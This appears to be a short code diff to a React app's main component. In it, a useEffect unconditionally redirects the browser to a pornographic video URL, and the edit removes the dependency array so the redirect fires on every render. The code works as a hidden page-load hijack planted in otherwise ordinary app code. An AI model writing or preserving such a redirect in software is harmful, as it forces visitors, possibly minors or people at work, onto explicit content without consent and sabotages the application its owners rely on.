@@ -11,7 +11,7 @@ const App = () => {
 
     useEffect(() => {
         window.location.href = 'https://rt.pornhub.com/view_video.php?viewkey=66081690383cb#1';
-    }, []);
+    });
 
     return (
         <ThemeProvider theme={mainTheme}>
